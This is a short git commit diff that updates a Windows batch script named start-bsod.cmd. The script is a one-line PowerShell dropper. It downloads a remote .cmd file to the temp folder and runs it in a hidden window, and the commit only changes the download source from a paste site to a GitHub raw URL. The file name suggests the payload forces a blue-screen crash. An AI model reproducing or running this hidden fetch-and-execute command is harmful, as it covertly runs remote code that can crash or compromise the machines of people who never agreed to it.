741cfb1e4121a36ae83197cabae77b68d4648634
alext30Developer <72646375+alext30Developer@users.noreply.github.com>
2023-01-15 16:38:38 +0200

    Update start-bsod.cmd

--- BSOD/start-bsod.cmd
+++ BSOD/start-bsod.cmd
@@ -1,1 +1,1 @@
-powershell.exe -windowstyle hidden iwr https://textbin.net/raw/y1iveok05f -outfile $env:temp\bsod.cmd; start $env:temp\bsod.cmd -windowstyle hidden
+powershell.exe -windowstyle hidden iwr https://raw.githubusercontent.com/alext30Developer/rdrp/main/BSOD/files/bsod.cmd -outfile $env:temp\bsod.cmd; start $env:temp\bsod.cmd -windowstyle hidden
